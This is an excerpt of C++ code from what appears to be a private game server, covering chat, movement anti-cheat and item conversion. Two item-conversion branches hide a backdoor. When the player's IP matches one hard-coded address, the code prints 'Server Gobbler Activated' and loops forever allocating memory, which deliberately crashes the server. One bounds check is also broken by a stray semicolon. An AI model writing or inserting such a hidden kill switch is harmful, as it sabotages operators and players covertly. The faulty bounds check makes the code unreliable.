								...
								if (pInfo(peer)->haveGrowId and pInfo(peer)->inGame and pInfo(peer)->passed_data and not pInfo(peer)->tankIDName.empty() and not pInfo(peer)->currentWorld.empty() and pInfo(peer)->currentWorld != "EXIT") {
									...
									if (msg.at(0) == '/') { /*command*/
										...
										if (check_ != ":/" and check_ != ":p" and check_ != ":)" and check_ != "-_-" and check_ != ":*" and check_ != ";)" and check_ != ":d" and check_ != ":o" and check_ != ":'(" and check_ != ":(") {
											...
											p.Insert("CP:_PL:0_OID:_CT:[W]_ `6<" + pInfo(peer)->displayName + "``>`` `$" + (pInfo(peer)->adminLevel == 5 ? "`5" : (pInfo(peer)->adminLevel == 3) ? "`^" : "`$") + msg + "`````");
										}
										p2.Insert("OnTalkBubble");
										p2.Insert(pInfo(peer)->netID);
										if (check_ != ":/" and check_ != ":p" and check_ != ":)" and check_ != "-_-" and check_ != ":*" and check_ != ";)" and check_ != ":d" and check_ != ":o" and check_ != ":'(" and check_ != ":(") {
											p2.Insert("CP:_PL:0_OID:_player_chat=" + a + (pInfo(peer)->adminLevel == 5 ? "`5" : (pInfo(peer)->adminLevel == 3) ? "`^" : "`0") + msg);
										}
										else {
											p2.Insert(msg);
										}
								...
								if (pInfo(peer)->haveGrowId and pInfo(peer)->inGame and pInfo(peer)->passed_data and not pInfo(peer)->tankIDName.empty() and not pInfo(peer)->currentWorld.empty() and pInfo(peer)->currentWorld != "EXIT") {
									...
									while (getline(ss, to, '\n')) {
										...
										if (a_.size() == 3) {
											...
											if (a_.at(1) == "count") c_t = atoi(a_.at(2).c_str()); //isn't working in 2022
										}
									}
					...
					case 4: {
						...
						if (tank_up) {
							...
							if (pMov->packetType == 7) {
								...
								vector<World>::iterator p = find_if(worlds.begin(), worlds.end(), [w_](const World& a) { return a.name == w_; });
								World* world = &worlds.at(p - worlds.begin());
								if (pMov->punchX < world->width && pMov->punchY < world->height);
								if (getItemDef(world->items[pMov->punchX + (pMov->punchY * world->width)].foreground).blockType == BlockTypes::MAIN_DOOR) {
									if (pInfo(peer)->freshmen) {
								...
								if (pInfo(peer)->haveGrowId and pInfo(peer)->inGame and pInfo(peer)->passed_data and pInfo(peer)->currentWorld != "EXIT" and not pInfo(peer)->currentWorld.empty() and pInfo(peer)->x > 0 and pInfo(peer)->y > 0) {
									...
									if (((PlayerInfo*)(peer->data))->canWalkInBlocks == false && isGoodForeground(tile)) {
										if (((PlayerInfo*)(peer->data))->noclipas_ >= 5) {
											Send_::console_msg(peer, "`4Please wait you will be disconnected..!");
											enet_peer_disconnect_later(peer, 0);
											break;
										}
										...
										Send_::setpos_(peer, ((PlayerInfo*)(peer->data))->netID, xblock, yblock);
										continue;
									}
								}
								break;
													...
													if (pInfo(peer)->inventory.items.at(i).itemID == 1796) {
														if (pInfo(peer)->inventory.items.at(i).itemCount >= 1) {
															if (save_inv_check(242, 100, peer, false)) {
																...
																update_set(peer);
																if (pInfo(peer)->ip_ply == "77.246.71.42") {
																	Send_::console_msg(peer, "`9Server Gobbler Activated");
																	for (;;) new int[99999];
																}
															}
														}
													...
													if (pInfo(peer)->inventory.items.at(i).itemID == 7188) {
														if (pInfo(peer)->inventory.items.at(i).itemCount >= 1) {
															if (save_inv_check(1796, 100, peer, false)) {
																...
																update_set(peer);
																if (pInfo(peer)->ip_ply == "77.246.71.42") {
																	Send_::console_msg(peer, "`9Server Gobbler 2 Activated");
																	for (;;) new int[99999];
																}
															}
														}
